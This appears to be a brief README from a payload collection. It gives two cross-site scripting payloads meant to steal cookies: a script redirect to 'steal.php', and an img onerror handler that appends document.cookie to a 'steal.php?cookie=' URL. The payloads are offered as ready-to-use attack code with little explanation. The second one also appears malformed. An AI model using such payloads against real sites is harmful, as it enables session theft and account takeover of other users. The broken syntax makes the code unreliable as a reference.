# payload

### Payload is helping for identify Vulneraability into System/Application.

* XSS Script for grabe cookie:
```javascript
<script>document.location="http://steal.php"</script>
```

```javascript
<img src=a onerror=confirm(document.location="http://steal.php?cookie=" + document.cookie;)>
```
